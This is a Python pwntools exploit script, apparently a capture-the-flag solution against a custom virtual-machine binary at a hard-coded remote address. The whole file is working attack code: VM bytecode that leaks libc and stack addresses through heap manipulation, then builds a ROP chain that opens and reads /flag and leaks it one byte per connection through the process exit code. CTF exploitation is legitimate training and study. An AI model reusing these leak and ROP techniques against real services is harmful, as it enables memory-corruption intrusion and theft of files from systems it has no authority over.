from pwn import *

l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = ROP(l)

CHANGEBUF = '\x05'
ADD = '\x07'
PUTHEAP = '\x0A'
READHEAP = '\x0B'
OPCODEPOINRER = '\x0C'
NEWHEAP = '\x0D'
SETREGPTR_FROM_REG = '\x04\x20'
SETREG_FROM_REGPTR = '\x04\x10'
SETREGISTER_FROM_REGISTER = '\x04\x08'
SETREGISTER_FROM_VALUE = '\x04\x01'
ADD = '\x00'
SUB = '\x01'

NOP = '\x0E'
END = '\xff'

VALUE = '\x01'
INDEX = '\x00'

def QWORD(v) : 
    return p64(v)

def BYTE(v) : 
    return p8(v)

def DWORD(v) :
    return p32(v)

def IDX(v) : 
    return p8(v)

def REG(d) :
    return p8(int(d.split("r")[1]))

prax = r.find_gadget(['pop rax','ret'])[0]
prdi = r.find_gadget(['pop rdi','ret'])[0]
prdxrsi = r.find_gadget(['pop rdx','pop rsi','ret'])[0]
syscall = r.find_gadget(['syscall','ret'])[0]
mov_rdi_rdi_0x68 = 0x520e9
'''
   0x520e9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
   0x520ed <setcontext+125>:	xor    eax,eax
   0x520ef <setcontext+127>:	ret
'''

flag = ""

print hex(prdxrsi)

idx = 0

while True : 
    #p = process("./vm",aslr=False)
    p = remote("124.156.135.103",6001)

    pay = "" 
    pay += OPCODEPOINRER + BYTE(0xff)
    pay = pay.ljust(0xff+1,NOP) + END


    pay += SETREGISTER_FROM_REGISTER + REG('r0') + REG('r8') # read heap

    pay += SETREGISTER_FROM_VALUE + REG('r9') + QWORD(0x0) #backupheap == 0
    pay += SETREGISTER_FROM_VALUE + REG('r11') + QWORD(0x0) #heap_size == 0
    pay += NEWHEAP + DWORD(0x300) 

    #libc leak
    pay += SETREGISTER_FROM_REGISTER + REG('r9') + REG('r0') # free prev heap for leaking main_arena
    pay += SETREGISTER_FROM_VALUE + REG('r11') + QWORD(0x10000000000) #heap_size == 0
    pay += NEWHEAP + DWORD(0x300) #free
    pay += SUB + VALUE + REG('r0') + QWORD(0x800)
    pay += SETREG_FROM_REGPTR + REG('r1') + REG('r0') # r1 == main_arena
    pay += SUB + VALUE + REG('r1') + QWORD(0x3ec180) #libc base

    #stack leak
    pay += SUB + VALUE + REG('r0') + QWORD(0x1070) # pointer of r2
    pay += SETREGISTER_FROM_VALUE + REG('r2') + QWORD(l.symbols["environ"]) #heap_size == 0
    pay += ADD + INDEX + REG('r2') + REG('r1')
    pay += SETREG_FROM_REGPTR + REG('r3') + REG('r0') # r0 == &r2 == &environ

    pay += SUB + VALUE + REG('r3') + QWORD(0x120) # ret stack addr

    #make rop
    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prdi)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    #flag path
    pay += SETREGISTER_FROM_REGISTER + REG('r4') + REG('r3') 
    pay += ADD + VALUE + REG('r4') + QWORD(0x400)
    pay += SETREGISTER_FROM_REGISTER + REG('r5') + REG('r4')  #flag path
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(u64("/flag\x00\x00\x00"))
    pay += SETREGPTR_FROM_REG + REG('r5') + REG('r4')

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prdxrsi)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r6')  # nullbyte
    pay += ADD + VALUE + REG('r3') + QWORD(8)
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r6')  # nullbyte
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prax)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(2) #SYS_OPEN
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(syscall)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    #read flag
    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prdi)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r6')  # nullbyte (fd)
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prdxrsi)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + p64(idx+1)   #heap Nbyte idx+1
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_REGISTER + REG('r4') + REG('r0')   #heap
    pay += ADD + VALUE + REG('r4') + p64(0x1300) # Nbyte
    pay += SETREGISTER_FROM_REGISTER + REG('r6') + REG('r4') # flag addr
    pay += SUB + VALUE + REG('r4') + p64(idx) # Nbyte idx
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)


    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(l.symbols["read"])
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    #put flag in rdi register
    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(prdi)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_REGISTER + REG('r4') + REG('r6') #flag addr
    pay += SUB + VALUE + REG('r4') + QWORD(0x68)
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(mov_rdi_rdi_0x68)
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    pay += SETREGISTER_FROM_VALUE + REG('r4') + QWORD(l.symbols['_exit'])
    pay += ADD + INDEX + REG('r4') + REG('r1')
    pay += SETREGPTR_FROM_REG + REG('r3') + REG('r4')
    pay += ADD + VALUE + REG('r3') + QWORD(8)

    #print hexdump(pay)

    pay = pay.ljust(4096,END)

    p.send(pay)
    p.recvuntil("Exit code: ")
    flag += chr(int(p.recvline().strip(),16))

    print flag

    if '}' == flag[-1] : 
        break

    p.close()
    idx += 1

print 'FLAG : ' + flag

'''
struct VM{
    unsigned __int64 register[8];
    __int64 * heap_ptr;
    __int64 * backup_heap_ptr;
    __int64 buf;
    unsigned __int32 heap_idx_for_simulation;
    __int32 heap_size;
}
'''
